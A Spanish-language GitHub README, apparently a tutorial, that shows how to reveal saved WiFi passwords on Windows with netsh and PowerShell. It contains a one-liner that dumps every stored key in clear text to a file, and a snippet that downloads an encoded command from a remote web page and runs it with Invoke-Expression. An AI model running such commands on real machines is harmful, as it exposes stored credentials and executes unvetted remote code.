# Wlan-Profiles
Aplicación Wlan Profiles hackear contraseñas de wifi
Cómo ver la contraseña de una red WiFi a la que estás conectado en Windows 
Es muy fácil saber la contraseña de la red WiFi a la que estás conectado en Windows, te explicamos cómo.
Si ya te has conectado con tu PC o portátil Windows a una red con contraseña, y ahora quieres conectar 
también tu smartphone o alguien te pregunta la clave y no la recuerdas, es muy fácil “recuperarla” desde tu ordenador.
![](https://3.bp.blogspot.com/-oPb9wuB5nUk/WjRqB56LuCI/AAAAAAAAI3A/wonBBPq85QEbBQmgxkGoWDTxBNlMa6_mwCLcBGAs/s200/lpericena%2Bwifi.png)
https://www.lpericena.tk/2019/03/importar-perfiles-wlan-con-powershell.html

```
(netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=
clear)}>>wifi.txt
```
![](https://1.bp.blogspot.com/-MklkR5Po3Lk/XIvsQU3GKCI/AAAAAAAAOI4/2-lJrvpaGRYGL0DGn2JOuJJaBx722ITDACLcBGAs/s1600/powershell.png)
```
$url="https://www.jesusninoc.com/2017/01/24/hackear-wifi-con-powershell-script-codificado-en-base64/"
$result = Invoke-WebRequest $url
[String]$execute=$result.AllElements | Where class -eq 'crayon-pre' | %{$_.innerText}
Invoke-Expression "powershell -encodedcommand $execute"
```
![](https://4.bp.blogspot.com/-ShOocj2HPUM/XIuW5KbQhdI/AAAAAAAAOHc/pUdjWkNLFachuykLCPACzlIQGt-YYvtaACLcBGAs/s1600/Screenshot_94.png)
### Otros comandos 
- información del interfas del sistema.
Get-NetAdapter
- Para ver información de la interfaz de red WiFi.
Get-NetAdapter -Name Wi-Fi
- Mostrar cmdlets relacionados con el adaptador de red.
gcm -Noun netadapter | select name, modulename
- Utilizando netsh.
netsh wlan show networks mode=bssid

<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
<input type="hidden" name="cmd" value="_s-xclick" />
<input type="hidden" name="hosted_button_id" value="MJPRV838AYA2J" />
<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" title="PayPal - The safer, easier way to pay online!" alt="Donate with PayPal button" />
<img alt="" border="0" src="https://www.paypal.com/en_BO/i/scr/pixel.gif" width="1" height="1" />
</form>
<!-- Start of adf.ly banner code --><a href="https://join-adf.ly/21179079"><img border="0" src="https://cdn.ay.gy/images/banners/adfly.350x19.1.png" width="320" height="23" title="AdF.ly - acorta links y gana dinero!" /></a>
<!-- End of adf.ly banner code -->


Sigueme en las redes Sociales:
- 🌎Blogger          https://lpericena.blogspot.com/
- 💡 Github            https://github.com/Pericena
- 🎬 youtube.com  https://www.youtube.com/channel/UCELx1m-NeAdBn7mCuQ86kcw
- 📸 pinterest        https://es.pinterest.com/lushiopericena/
- 🐤 twitter             https://twitter.com/LPericena
- 👦 linkedin         https://www.linkedin.com/in/lpericena/
- 👍 facebook       https://www.facebook.com/profile.php?id=100009309755063
- 👍 pagina facebook  https://www.facebook.com/lpericena
- 🎮 sitio web        https://pericena.wordpress.com/
- vimeo         https://vimeo.com/lpericena
- 📷 instagram      https://www.instagram.com/lpericena/
- 🎁 remote      https://remote.com/luishinopericena-choque
- ⚛ google+   https://plus.google.com/u/0/114054031405340478901
- 🚀 kiwi       https://kiwi.qa/LuishinoC
- 📅 App    https://apps.facebook.com/167466933725219
- 👻 Grupo    https://www.facebook.com/groups/122223121705126/?source_id=1506435219407506
- 🎧 socialtools https://www.socialtools.me/index?action=demoApps&preview=1&app_id=406101
- ツ teachlr    https://teachlr.com/lpericena
- 📖  wikipedia  https://es.wikipedia.org/wiki/Usuario:Luishi%C3%B1o_Pericena_Choque
- 📧 ask          https://ask.fm/Lpericena
- 💻 stackoverflow  https://stackoverflow.com/users/6506592/luishi%C3%B1o-pericena-choque
- 📡 wix https://lpericena.wixsite.com/curriculumvitae
